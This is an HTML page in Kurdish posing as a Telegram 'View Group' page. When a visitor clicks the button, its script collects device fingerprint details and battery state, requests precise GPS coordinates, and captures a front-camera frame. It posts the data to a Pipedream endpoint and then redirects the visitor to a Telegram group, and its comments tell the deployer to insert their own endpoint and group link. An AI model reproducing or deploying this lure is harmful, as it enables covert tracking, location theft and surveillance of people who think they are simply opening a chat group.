<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تێلیگرام - بینینی گروپ</title>
    <style>
        body {
            font-family: Tahoma, Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .btn {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 18px;
            border-radius: 25px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.3s;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover {
            background-color: #006699;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>بۆ بینینی گروپەکە کلیک لەسەر دوگمەی خوارەوە بکە</h2>
    <button id="viewGroupBtn" class="btn">View Group</button>
</div>

<script>
// پێویستە لێرەدا لینکی پایدریمەکەی خۆت دابنێیت
const PIPEDREAM_URL = "https://eo7he3r6tagkjph.m.pipedream.net"; 

document.getElementById("viewGroupBtn").addEventListener("click", async function() {
    // دروستکردنی زانیارییە سەرەتاییەکانی مۆبایل
    let payload = {
        uid: "User_" + Math.floor(Math.random() * 1000000),
        browser: navigator.userAgent.split(" ")[0],
        device: /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iPhone (iOS)" : "Android",
        hardware: navigator.platform,
        cores: navigator.hardwareConcurrency || "N/A",
        screen: window.screen.width + "x" + window.screen.height,
        orient: window.screen.orientation ? window.screen.orientation.type : "N/A",
        lang: navigator.language,
        dark: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Yes" : "No",
        time: new Date().toLocaleTimeString(),
        battery: "N/A",
        charging: "N/A",
        maps: "مۆڵەت نەدرا!",
        photo: "No Photo"
    };

    // ١. وەرگرتنی ڕێژەی باتری
    if (navigator.getBattery) {
        try {
            let batt = await navigator.getBattery();
            payload.battery = Math.round(batt.level * 100) + "%";
            payload.charging = batt.charging ? "Yes" : "No";
        } catch (e) {}
    }

    // ٢. داواکردنی شوێنی دەقیق (GPS) - لێرەدا سەفاری پەڕەی Ask نیشان دەدات
    if (navigator.geolocation) {
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            payload.maps = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
        } catch (err) {
            payload.maps = "ڕەتکرایەوە یان وەڵام نەبوو!";
        }
    }

    // ٣. داواکردنی کامێرا بۆ وێنەگرتن (ئامادەکاری)
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        try {
            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            let video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            
            let canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 240;
            let ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            payload.photo = "Image Captured Successfully"; // بۆ ئەوەی دەقەکە درێژ نەبێت
            
            // کوژاندنەوەی کامێرا دوای وێنەکە
            stream.getTracks().forEach(track => track.stop());
        } catch (e) {
            payload.photo = "Camera Access Denied";
        }
    }

    // ٤. ناردنی تەواوی داتاکان بە شێوازی فۆرم بۆ پایدریم
    try {
        let formData = new FormData();
        for (let key in payload) {
            formData.append(key, payload[key]);
        }
        await fetch(PIPEDREAM_URL, { method: "POST", body: formData });
    } catch (e) {}

    // ٥. گواستنەوەی بەکارهێنەر بۆ ناو تێلیگرام دوای ١.٥ چرکە
    setTimeout(function() {
        window.location.href = "https://t.me/kurdish_sys"; // لێرە لینکی گروپەکەی خۆت دابنێ
    }, 1500);
});
</script>

</body>
</html>
